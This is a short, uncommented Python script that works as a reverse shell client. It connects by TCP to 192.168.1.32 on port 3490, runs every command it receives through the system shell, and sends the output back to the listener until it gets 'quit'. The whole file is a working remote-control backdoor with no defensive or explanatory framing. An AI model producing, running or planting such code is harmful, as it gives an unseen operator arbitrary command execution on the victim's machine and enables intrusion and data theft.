import socket 
import subprocess

def return_info():
    while 1:
        command = sock.recv(1024)
        if command.decode('utf-8') == "quit":
            break
        proc = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read() 
        command_str = "executed command: " + command.decode('utf-8') + '\n' + result.decode('utf-8')
        sock.send(command_str.encode('utf-8'))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.32", 3490))

return_info()
sock.close()